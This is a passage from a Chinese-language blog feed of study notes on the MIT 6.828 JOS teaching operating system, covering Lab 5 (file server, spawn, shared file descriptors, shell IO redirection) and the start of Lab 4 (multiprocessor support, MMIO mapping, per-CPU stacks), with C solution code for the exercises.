%e&quot;</span>, r);</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Save the file pointer</span></span><br><span class="line">    o-&gt;o_file = f;                                      <span class="comment">//保存File结构到OpenFile结构</span></span><br><span class="line">    <span class="comment">// Fill out the Fd structure</span></span><br><span class="line">    o-&gt;o_fd-&gt;fd_file.id = o-&gt;o_fileid;</span><br><span class="line">    o-&gt;o_fd-&gt;fd_omode = req-&gt;req_omode &amp; O_ACCMODE;</span><br><span class="line">    o-&gt;o_fd-&gt;fd_dev_id = devfile.dev_id;</span><br><span class="line">    o-&gt;o_mode = req-&gt;req_omode;</span><br><span class="line">    <span class="keyword">if</span> (debug)</span><br><span class="line">        cprintf(<span class="string">&quot;sending success, page %08x\n&quot;</span>, (<span class="keyword">uintptr_t</span>) o-&gt;o_fd);</span><br><span class="line">    <span class="comment">// Share the FD page with the caller by setting *pg_store,</span></span><br><span class="line">    <span class="comment">// store its permission in *perm_store</span></span><br><span class="line">    *pg_store = o-&gt;o_fd;</span><br><span class="line">    *perm_store = PTE_P|PTE_U|PTE_W|PTE_SHARE;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数首先从opentab这个OpenFile数组中寻找一个未被使用的OpenFile结构，上图中假设找到数据第一个OpenFile结构就是未使用的。如果open()中参数mode设置了O_CREAT选项，那么就会调用fs/fs.c中的file_create函数来根据路径创建一个新的File结构，并保存到OpenFile结构的o_file字段中。结束后，serve()会将OpenFile结构对应的Fd起始地址发送给客户端进程，所以客户进程从open()返回后，新分配的fd和fs进程fd共享相同的物理页。</p><h1 id="Spawning-Processes"><a href="#Spawning-Processes" class="headerlink" title="Spawning Processes"></a>Spawning Processes</h1><p>lib/spawn.c中的spawn()创建一个新的进程，从文件系统加载用户程序，然后启动该进程来允许这个程序。spawn()就像UNIX中的fork()后面马上跟着exec()。</p><p><code>spawn(const char *prog, const char **argv)</code>做如下一系列动作：</p><ol><li>从文件系统打开prog程序文件</li><li>调用系统调用sys_exofork()创建一个新的Env结构</li><li>调用系统调用sys_env_set_trapframe()，设置新的Env结构的Trapframe字段(该字段包含寄存器信息)</li><li>根据ELF文件中program header，将用户程序以Segment读入内存，并映射到指定的线性地址处</li><li>调用系统调用sys_env_set_status()设置新的Env结构状态为ENV_RUNABLE。</li></ol><p><strong>exercise7</strong></p><p>实现sys_env_set_trapframe()系统调用。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sys_env_set_trapframe(<span class="keyword">envid_t</span> envid, struct Trapframe *tf)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 5: Your code here.</span></span><br><span class="line"><span class="comment">// Remember to check whether the user has supplied us with a good</span></span><br><span class="line"><span class="comment">// address!</span></span><br><span class="line"><span class="comment">//panic(&quot;sys_env_set_trapframe not implemented&quot;);</span></span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">e</span>;</span></span><br><span class="line"><span class="keyword">if</span>((r = envid2env(envid,&amp;e,<span class="number">1</span>)) &lt; <span class="number">0</span>) <span class="keyword">return</span> r;</span><br><span class="line">tf-&gt;tf_eflags = FL_IF;</span><br><span class="line">tf-&gt;tf_eflags &amp;= ~FL_IOPL_MASK;<span class="comment">//普通进程不能有IO权限</span></span><br><span class="line">tf-&gt;tf_cs = GD_UT | <span class="number">3</span>;</span><br><span class="line">e-&gt;env_tf = *tf;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Sharing-library-state-across-fork-and-spawn"><a href="#Sharing-library-state-across-fork-and-spawn" class="headerlink" title="Sharing library state across fork and spawn"></a>Sharing library state across fork and spawn</h2><p>UNIX文件描述符是一个大的概念，包含pipe，控制台I/O。在JOS中每种设备对应一个struct Dev结构，该结构函数函数指针，指向真正实现读写操作的函数。</p><p>lib/fd.c文件实现了UNIX文件描述符接口，但大部分函数都是简单对struct Dev结构指向的函数的包装。</p><p>我们希望共享文件描述符，JOS中定义PTE新的标志位PTE_SHARE，如果有个页表条目的PTE_SHAER标志位为1，那么这个PTE在fork()和spawn()中将直接拷贝到子进程页表，从而让父进程和子进程共享相同的页映射关系，从而达到父子进程共享文件描述符的目的。</p><p><strong>exercise8</strong></p><p>修改lib/fork.c中的duppage()，使之正确处理有PTE_SHARE标志的页表条目。同时实现lib/spawn.c中的copy_shared_pages()。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">duppage(<span class="keyword">envid_t</span> envid, <span class="keyword">unsigned</span> pn)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="keyword">void</span> *addr = (<span class="keyword">void</span>*) (pn * PGSIZE);</span><br><span class="line"><span class="keyword">if</span>(uvpt[pn] &amp; PTE_SHARE)&#123;</span><br><span class="line">sys_page_map(<span class="number">0</span>, addr, envid, addr, PTE_SYSCALL);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> ((uvpt[pn] &amp; PTE_W) || (uvpt[pn] &amp; PTE_COW)) &#123; <span class="comment">//对于UTOP以下的可写的或者写时拷贝的页，拷贝映射关系的同时，需要同时标记当前进程和子进程的页表项为PTE_COW</span></span><br><span class="line"><span class="keyword">if</span> ((r = sys_page_map(<span class="number">0</span>, addr, envid, addr, PTE_COW|PTE_U|PTE_P)) &lt; <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;sys_page_map：%e&quot;</span>, r);</span><br><span class="line"><span class="keyword">if</span> ((r = sys_page_map(<span class="number">0</span>, addr, <span class="number">0</span>, addr, PTE_COW|PTE_U|PTE_P)) &lt; <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;sys_page_map：%e&quot;</span>, r);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">sys_page_map(<span class="number">0</span>, addr, envid, addr, PTE_U|PTE_P);<span class="comment">//对于只读的页，只需要拷贝映射关系即可</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>copy_shared_pages()</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">copy_shared_pages(<span class="keyword">envid_t</span> child)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 5: Your code here.</span></span><br><span class="line"><span class="keyword">uintptr_t</span> addr;</span><br><span class="line"><span class="keyword">for</span> (addr = <span class="number">0</span>; addr &lt; UTOP; addr += PGSIZE) &#123;</span><br><span class="line"><span class="keyword">if</span> ((uvpd[PDX(addr)] &amp; PTE_P) &amp;&amp; (uvpt[PGNUM(addr)] &amp; PTE_P) &amp;&amp;</span><br><span class="line">(uvpt[PGNUM(addr)] &amp; PTE_U) &amp;&amp; (uvpt[PGNUM(addr)] &amp; PTE_SHARE)) &#123;</span><br><span class="line">            sys_page_map(<span class="number">0</span>, (<span class="keyword">void</span>*)addr, child, (<span class="keyword">void</span>*)addr, (uvpt[PGNUM(addr)] &amp; PTE_SYSCALL));</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="The-keyboard-interface"><a href="#The-keyboard-interface" class="headerlink" title="The keyboard interface"></a>The keyboard interface</h1><p><strong>exercise9</strong></p><p>在trap.c的trap_dispatch中加入下面的代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (tf-&gt;tf_trapno == IRQ_OFFSET + IRQ_KBD)&#123;</span><br><span class="line">kbd_intr();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_trapno == IRQ_OFFSET + IRQ_SERIAL)&#123;</span><br><span class="line">serial_intr();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="The-Shell"><a href="#The-Shell" class="headerlink" title="The Shell"></a>The Shell</h1><p>运行make run-icode，将会执行user/icode，user/icode又会执行inti，然后会spawn sh。然后就能运行如下指令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo hello world | cat</span><br><span class="line">cat lorem |cat</span><br><span class="line">cat lorem |num</span><br><span class="line">cat lorem |num |num |num |num |num</span><br><span class="line">lsfd</span><br></pre></td></tr></table></figure><p><strong>Exercise 10</strong></p><p>目前shell还不支持IO重定向，修改user/sh.c，增加IO该功能。</p><p>在runcmd函数中添加如下片段：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>((fd = open(t,O_RDONLY)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">cprintf(<span class="string">&quot;file %s is no exist\n&quot;</span>, t);</span><br><span class="line"><span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(fd != <span class="number">0</span>)&#123;</span><br><span class="line">dup(fd,<span class="number">0</span>);</span><br><span class="line">close(fd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li><p>构建文件系统：</p><ol><li><p>引入一个文件系统进程的特殊进程，该进程提供文件操作的接口。具体实现在fs/bc.c、fs/fs.c、fs/serv.c中</p></li><li><p>建立RPC机制，客户端进程向FS进程发送请求，FS进程真正执行文件操作。客户端进程的实现在lib/file.c，lib/fd.c中。客户端进程和FS进程交互可总结为下图</p><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab5/lab5_6_fs%E8%BF%9B%E7%A8%8B%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86.png" alt="客户端进程和FS进程交互"></p></li><li><p>更高级的抽象，引入文件描述符。通过文件描述符这一层抽象可以将控制台，pipe，普通文件统统按照文件来对待。文件描述符和pipe的原理总结如下：</p><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab5/lab5_5_%E6%96%87%E4%BB%B6_fd%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86_pipe%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86.png" alt="文件描述符和pipe原理"></p></li></ol></li><li><p>支持从磁盘加载程序并运行。实现spawn()，该函数创建一个新的进程，并从磁盘加载程序运行，类似UNIX中的fork()后执行exec()。</p></li></ol><p><img src="https://inews.gtimg.com/newsapp_ls/0/13929718502/0" alt="image-20210828225527202"></p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/08/24/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab5/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【MIT 6.828】JOS学习笔记 Lab4</title>
      <link>https://billyotry.github.io/2021/08/08/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab4/</link>
      <guid>https://billyotry.github.io/2021/08/08/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab4/</guid>
      <pubDate>Sun, 08 Aug 2021 14:12:16 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;在lab4中多了如下文件：kern/cpu.h、kern/mpconfig.c、kern/lapic.c、kern/mpentry.S、kern/spinlock.h、kern/spinlock.c、kern/sched.c&lt;/p&gt;
&lt;h2 id=&quot;Part-A-Multi
        
      
      </description>
      
      
      <content:encoded><![CDATA[<p>在lab4中多了如下文件：kern/cpu.h、kern/mpconfig.c、kern/lapic.c、kern/mpentry.S、kern/spinlock.h、kern/spinlock.c、kern/sched.c</p><h2 id="Part-A-Multiprocessor-Support-and-Cooperative-Multitasking"><a href="#Part-A-Multiprocessor-Support-and-Cooperative-Multitasking" class="headerlink" title="Part A: Multiprocessor Support and Cooperative Multitasking"></a>Part A: Multiprocessor Support and Cooperative Multitasking</h2><p>在这个lab的第一部分，我们首先拓展JOS让其能在多处理器系统上运行，然后实现一些新的JOS内核系统调用以允许用户级环境创建额外的新环境。还将实现协作循环调度，当当前环境自愿放弃CPU(或退出)时，允许内核从一种环境切换到另一种环境。在第三部分中，还将实现抢占式调度，即使环境不合作，它也允许内核在经过一定时间后从环境中重新控制CPU。</p><h3 id="Multiprocessor-Support"><a href="#Multiprocessor-Support" class="headerlink" title="Multiprocessor Support"></a>Multiprocessor Support</h3><p>我们将让JOS支持”对称多处理”(SMP)，一种多处理器模型，其中所有CPU都具有对系统资源(如内存和IO总线)的同等访问权限。虽然在SMP模型中所有的CPU的功能都是相同的，但是启动的过程中，还是可以分为两种类型：引导处理器(BSP)负责初始化系统和引导操作系统；另一种是只有在操作系统启动并允许后，应用处理器(AP)才会被BSP激活。哪个处理器作为BSP是由硬件和BIOS决定。到目前为止，我们所有的JOS代码都已在BSP上允许。</p><p>在SMP系统中，每个CPU都有一个伴随的本地APIC(LAPIC) 单元。LAPIC单元负责在整个系统中传送中断。LAPIC还为其连接的 CPU提供唯一标识符，在本lab中，我们使用LAPIC单元的以下基本功能(kern/lapic.c)：</p><ul><li>读取LAPIC标识符(APIC ID)来判断我们的代码现在允许在哪个CPU上(查看cpunum())</li><li>从BSP向AP发送STARTUP处理器间中断(IPI)以启动其他CPU(查看lapic_startap())</li><li>在第三部分，我们对LAPIC的内置定时器进行编程以触发时钟中断以支持抢占式多任务处理(查看apic_init())</li></ul><p>处理器访问LAPIC使用内存映射IO(MMIO)，这样就能通过访问内存达到访问设备寄存器的目的。LAPIC从物理地址0xFE000000开始，JOS将通过MMIOBASE虚拟地址访问该物理地址。</p><p><strong>exercise1</strong></p><p>实现文件kern/pmap.c中的mmio_map_region函数。这个函数管理内存映射IO地址，输入一个在范围内的物理地址，函数返回一个虚拟地址，那么这个物理地址就被映射到这个虚拟地址上。这个也是一个分配器，比较原始，原理就和boot_alloc类似。从MMIOBASE开始分配，每次分配都是以页为单位。故函数维持了一个全局变量，表示当前分配到的地址，并将参数上调到<code>4096</code>的边界。这些操作和boot_alloc一样。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">mmio_map_region(<span class="keyword">physaddr_t</span> pa, <span class="keyword">size_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Where to start the next region.  Initially, this is the</span></span><br><span class="line"><span class="comment">// beginning of the MMIO region.  Because this is static, its</span></span><br><span class="line"><span class="comment">// value will be preserved between calls to mmio_map_region</span></span><br><span class="line"><span class="comment">// (just like nextfree in boot_alloc).</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uintptr_t</span> base = MMIOBASE;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Reserve size bytes of virtual memory starting at base and</span></span><br><span class="line"><span class="comment">// map physical pages [pa,pa+size) to virtual addresses</span></span><br><span class="line"><span class="comment">// [base,base+size).  Since this is device memory and not</span></span><br><span class="line"><span class="comment">// regular DRAM, you&#x27;ll have to tell the CPU that it isn&#x27;t</span></span><br><span class="line"><span class="comment">// safe to cache access to this memory.  Luckily, the page</span></span><br><span class="line"><span class="comment">// tables provide bits for this purpose; simply create the</span></span><br><span class="line"><span class="comment">// mapping with PTE_PCD|PTE_PWT (cache-disable and</span></span><br><span class="line"><span class="comment">// write-through) in addition to PTE_W.  (If you&#x27;re interested</span></span><br><span class="line"><span class="comment">// in more details on this, see section 10.5 of IA32 volume</span></span><br><span class="line"><span class="comment">// 3A.)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Be sure to round size up to a multiple of PGSIZE and to</span></span><br><span class="line"><span class="comment">// handle if this reservation would overflow MMIOLIM (it&#x27;s</span></span><br><span class="line"><span class="comment">// okay to simply panic if this happens).</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint: The staff solution uses boot_map_region.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Your code here:</span></span><br><span class="line"><span class="comment">//panic(&quot;mmio_map_region not implemented&quot;);</span></span><br><span class="line"><span class="keyword">void</span> *ret = (<span class="keyword">void</span>*)base;</span><br><span class="line">size = ROUNDUP(size,PGSIZE);</span><br><span class="line"><span class="keyword">if</span>(base + size &gt; MMIOLIM || base + size &lt; base)&#123;</span><br><span class="line">panic(<span class="string">&quot;mmio_map_region(): overflow&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">boot_map_region(kern_pgdir,base,size,pa,PTE_W|PTE_PCD|PTE_PWT);</span><br><span class="line">base += size;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Application-Processor-Bootstrap"><a href="#Application-Processor-Bootstrap" class="headerlink" title="Application Processor Bootstrap"></a>Application Processor Bootstrap</h4><p>在启动AP之前，BSP需要搜集多处理器的信息，比如总共有多少个CPU，它们的LAPIC ID以及LAPIC MMIO地址。mp_init函数从BIOS中读取这些信息。具体代码在mp_init中，该函数会在进入内核后由i386_init函数调用，主要作用就是读取mp configuration table中保存的CPU信息，初始化cpus数组，ncpu(总共可用的CPU个数)，bootcput指针(指向BSP对应的CpuInfo结构)。</p><p>boot_aps函数驱动AP引导程序，AP以实模式启动，很像引导程序在boot/boot.S中的启动方式，因此boot_aps函数将AP入口代码复制到实模式下寻址的内存位置。与引导加载程序不同的是，我们可以控制AP开始执行代码的位置，我们将入口代码复制到0x7000，但任何未使用的、页面对齐的低于640kb的物理地址都可以使用。</p><p>之后，boot_aps函数通过发送STARTUP的IPI(处理器间中断)信号到AP的LAPIC单元来一个个激活AP。在kern/mpentry.S中的入口代码跟boot/boot.S中的代码类似。在一些简短的配置后，它使AP进入开启分页机制的保护模式，调用C语言的setup函数mp_main。boot_aps 等待AP在其结构CpuInfo的cpu_status字段中发出CPU_STARTED标志信号，然后再唤醒下一个。</p><p><strong>exercise2</strong></p><p>我们需要修改我们kern/pmap.c中page_init函数的代码，来表示MPENTRY_PADDR处的地址已经不再是free的状态。因为这段地址已经被AP的引导器所占用。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">page_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 4:</span></span><br><span class="line"><span class="comment">// Change your code to mark the physical page at MPENTRY_PADDR</span></span><br><span class="line"><span class="comment">// as in use</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The example code here marks all physical pages as free.</span></span><br><span class="line"><span class="comment">// However this is not truly the case.  What memory is free?</span></span><br><span class="line"><span class="comment">//  1) Mark physical page 0 as in use.</span></span><br><span class="line"><span class="comment">//     This way we preserve the real-mode IDT and BIOS structures</span></span><br><span class="line"><span class="comment">//     in case we ever need them.  (Currently we don&#x27;t, but...)</span></span><br><span class="line"><span class="comment">//  2) The rest of base memory, [PGSIZE, npages_basemem * PGSIZE)</span></span><br><span class="line"><span class="comment">//     is free.</span></span><br><span class="line"><span class="comment">//  3) Then comes the IO hole [IOPHYSMEM, EXTPHYSMEM), which must</span></span><br><span class="line"><span class="comment">//     never be allocated.</span></span><br><span class="line"><span class="comment">//  4) Then extended memory [EXTPHYSMEM, ...).</span></span><br><span class="line"><span class="comment">//     Some of it is in use, some is free. Where is the kernel</span></span><br><span class="line"><span class="comment">//     in physical memory?  Which pages are already in use for</span></span><br><span class="line"><span class="comment">//     page tables and other data structures?</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Change the code to reflect this.</span></span><br><span class="line"><span class="comment">// NB: DO NOT actually touch the physical memory corresponding to</span></span><br><span class="line"><span class="comment">// free pages!</span></span><br><span class="line"><span class="comment">/*size_t i;</span></span><br><span class="line"><span class="comment">for (i = 0; i &lt; npages; i++) &#123;</span></span><br><span class="line"><span class="comment">pages[i].pp_ref = 0;</span></span><br><span class="line"><span class="comment">pages[i].pp_link = page_free_list;</span></span><br><span class="line"><span class="comment">page_free_list = &amp;pages[i];</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//mark page 0 as in use --1</span></span><br><span class="line">pages[<span class="number">0</span>].pp_ref = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//mark page [1,npages_basemem_before) in use</span></span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">size_t</span> npages_basemem_before = MPENTRY_PADDR / PGSIZE;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>;i &lt; npages_basemem_before;i++)&#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">0</span>;</span><br><span class="line">pages[i].pp_link = page_free_list;</span><br><span class="line">page_free_list = &amp;pages[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// skip the MPENTRY_PADDR</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> mpentry_start[], mpentry_end[];</span><br><span class="line"><span class="keyword">size_t</span> mpentry_lent = mpentry_end - mpentry_start;</span><br><span class="line"><span class="keyword">size_t</span> npages_mpentry = mpentry_lent / PGSIZE;</span><br><span class="line"><span class="keyword">size_t</span> mpentry_more = mpentry_lent % PGSIZE;</span><br><span class="line"><span class="keyword">if</span>(mpentry_more)&#123;</span><br><span class="line">npages_mpentry++;</span><br><span class="line">&#125;</span><br><span class="line">i = npages_basemem_before + npages_mpentry;</span><br><span class="line"><span class="keyword">for</span>(;i &lt; npages_basemem;i++)&#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">0</span>;</span><br><span class="line">pages[i].pp_link = page_free_list;</span><br><span class="line">page_free_list = &amp;pages[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//[IOPHYSMEM, EXTPHYSMEM) is never be allocated --3</span></span><br><span class="line"><span class="keyword">for</span>(;i&lt;EXTPHYSMEM/PGSIZE;i++)&#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//[EXTPHYSMEM, ...) --4</span></span><br><span class="line"><span class="comment">//in this part,we need to know which pages has been used for pages-table or page-directory or kernel</span></span><br><span class="line"><span class="keyword">physaddr_t</span> lasted_in_use_address = PADDR(boot_alloc(<span class="number">0</span>));</span><br><span class="line"><span class="keyword">size_t</span> last_number = lasted_in_use_address/PGSIZE;</span><br><span class="line"><span class="keyword">for</span>(;i&lt;last_number;i++)&#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">1</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//other pages for free</span></span><br><span class="line"><span class="keyword">for</span>(;i &lt; npages;i++)&#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">0</span>;</span><br><span class="line">pages[i].pp_link = page_free_list;</span><br><span class="line">page_free_list = &amp;pages[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时我们又能看见check_page_free_list() succeeded!了。</p><blockquote><p>Question</p><p>将kern/mpentry.S与boot/boot.S并排比较。 请记住，就像内核中的其他内容一样，kern/mpentry.S被编译、链接并运行在<code>KERNBASE</code>之上，宏MPBOOTPHYS的目的是什么？ 为什么这在在kern/mpentry.S很关键？换句话说，如果在kern/mpentry.S中省略了什么可能会出错？<strong>提示：回忆链接地址与加载地址的区别。</strong></p><p>boot.S中，由于尚没有启用分页机制，所以我们能够指定程序开始执行的地方以及程序加载的地址；但是，在mpentry.S的时候，由于主CPU已经处于保护模式下了，因此是不能直接指定物理地址的，给定线性地址，映射到相应的物理地址是允许的。</p></blockquote><h4 id="Per-CPU-State-and-Initialization"><a href="#Per-CPU-State-and-Initialization" class="headerlink" title="Per-CPU State and Initialization"></a>Per-CPU State and Initialization</h4><p>在编写多处理器操作系统时，区分每个处理器私有的CPU状态和整个系统共享的全局状态很重要。kern/cpu.h定义了大多数的per-CPU状态，包括CpuInfo结构体，这个结构体存储了per-CPU的变量。cpunum() 总是返回调用它的CPU的ID，它可以作为cpus数组的索引。thiscpu宏是当前CPU的结构CpuInfo的简写。</p><p>JOS使用CpuInfo结构体来记录CPU的信息：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CpuInfo</span> &#123;</span></span><br><span class="line"><span class="keyword">uint8_t</span> cpu_id;                 <span class="comment">// Local APIC ID; index into cpus[] below</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">unsigned</span> cpu_status;   <span class="comment">// The status of the CPU</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">cpu_env</span>;</span>            <span class="comment">// The currently-running environment.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Taskstate</span> <span class="title">cpu_ts</span>;</span>        <span class="comment">// Used by x86 to find stack for interrupt</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>每个CPU如下信息是当前CPU私有的：</p><ul><li>内核栈：因为多个CPU可以同时陷入内核，所以我们需要为每个处理器使用单独的内核堆栈，以防止它们被彼此干扰。<code>percpu_kstacks[NCPU][KSTKSIZE]</code>数组为每个CPU都保留了KSTKSIZE大小的内核栈</li><li>TSS和TSS描述符：每个CPU都需要单独的TSS和TSS描述符来指定该CPU对应的内核栈</li><li>进程结构指针：每个CPU都会独立允许一个进程的代码，所以需要Env指针</li><li>系统寄存器：比如cr3，gdt，ltr这些寄存器都是每个CPU私有的，每个CPU都需要单独设置</li></ul><p>到目前为之CpuInfo和Env的关系可以总结如下：</p><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab4/lab4_2_cpu%E5%92%8CEnv%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.png" alt="Env和CpuInfo关系"></p><p><strong>exercise 3</strong></p><p>处理器同时运行，不能共享一个栈，每个处理器都要有自己的栈。当然，这种区分是在虚拟地址层面上的，不是在物理地址层面上的，不同虚拟地址可以映射到相同物理地址，也可以映射到不同。在这里，我们当然希望能够映射到不同地址上。</p><p>主要工作在函数<code>mem_init_mp</code>，这个函数在<code>mem_init</code>初始化完成<code>BSP</code>使用的栈后调用，为各个<code>AP</code>映射栈地址。</p><p>讲义和代码注释要求我们给每个栈分配<code>KSTKSIZE</code>大小，中间留出<code>KSTKGAP</code>作为保护，使得一个栈溢出一定不会影响相邻的栈。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">mem_init_mp(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Map per-CPU stacks starting at KSTACKTOP, for up to &#x27;NCPU&#x27; CPUs.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// For CPU i, use the physical memory that &#x27;percpu_kstacks[i]&#x27; refers</span></span><br><span class="line"><span class="comment">// to as its kernel stack. CPU i&#x27;s kernel stack grows down from virtual</span></span><br><span class="line"><span class="comment">// address kstacktop_i = KSTACKTOP - i * (KSTKSIZE + KSTKGAP), and is</span></span><br><span class="line"><span class="comment">// divided into two pieces, just like the single stack you set up in</span></span><br><span class="line"><span class="comment">// mem_init:</span></span><br><span class="line"><span class="comment">//     * [kstacktop_i - KSTKSIZE, kstacktop_i)</span></span><br><span class="line"><span class="comment">//          -- backed by physical memory</span></span><br><span class="line"><span class="comment">//     * [kstacktop_i - (KSTKSIZE + KSTKGAP), kstacktop_i - KSTKSIZE)</span></span><br><span class="line"><span class="comment">//          -- not backed; so if the kernel overflows its stack,</span></span><br><span class="line"><span class="comment">//             it will fault rather than overwrite another CPU&#x27;s stack.</span></span><br><span class="line"><span class="comment">//             Known as a &quot;guard page&quot;.</span></span><br><span class="line"><span class="comment">//     Permissions: kernel RW, user NONE</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here:</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NCPU; i++) &#123;</span><br><span class="line">boot_map_region(kern_pgdir,KSTACKTOP - KSTKSIZE - i * (KSTKSIZE + KSTKGAP),KSTKSIZE,PADDR(percpu_kstacks[i]),PTE_W);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>exercise4</strong></p><p>在文件kern/trap.c中函数trap_init_percpu对BSP的TSS和TSS描述符进行初始化。上一个Lab留下的版本，不能正确的处理多处理器的情况，我们需要更改它，让它能够正确初始化每个AP的中断。在之前的lab中，trap_init_percpu函数在trap_init中调用，trap_init在i386_init中调用，这是给BSP初始化中断。AP内核的入口函数mp_main调用了trap_init_percpu，这是给各个AP初始化中断。在BSP调用的trap_init函数中，<strong>中断描述符表</strong>已经初始化完成了，在各个AP中也就没比要再做，故没有调用trap_init。</p><p>注意此时的代码已经执行在不同的CPU上了，而不是要初始化所有CPU，只需要初始化自身就可以了。用thiscpu-&gt;cpu_ts代替全局变量cpu_ts。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span 